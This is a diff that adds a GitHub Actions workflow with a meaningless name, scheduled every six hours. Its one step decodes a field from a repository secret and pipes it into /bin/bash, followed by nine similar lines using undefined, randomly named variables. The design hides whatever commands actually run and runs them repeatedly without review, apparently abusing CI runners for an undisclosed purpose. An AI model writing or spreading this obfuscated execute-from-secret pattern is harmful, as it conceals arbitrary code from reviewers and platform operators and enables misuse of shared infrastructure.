@@ -1,0 +1,26 @@
+name: shibanianlaoo
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '12 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: shibanianlaoo
+        env:
+          x0: ${{ secrets.x0 }}
+        run: |
+          echo $x0 | jq -r .twmxe58655 | /bin/bash
+          echo $kvar61 | jq -r .ub5210 | /bin/bash
+          echo $tla8638 | jq -r .uo579 | /bin/bash
+          echo $mtyk40139 | jq -r .n39228 | /bin/bash
+          echo $vnd137 | jq -r .apqm406 | /bin/bash
+          echo $mgh8 | jq -r .kbc095 | /bin/bash
+          echo $gtifh8815 | jq -r .udzq1423 | /bin/bash
+          echo $pa5 | jq -r .ph811 | /bin/bash
+          echo $la3318 | jq -r .tazff798 | /bin/bash
+          echo $hp68 | jq -r .aeky335 | /bin/bash
+
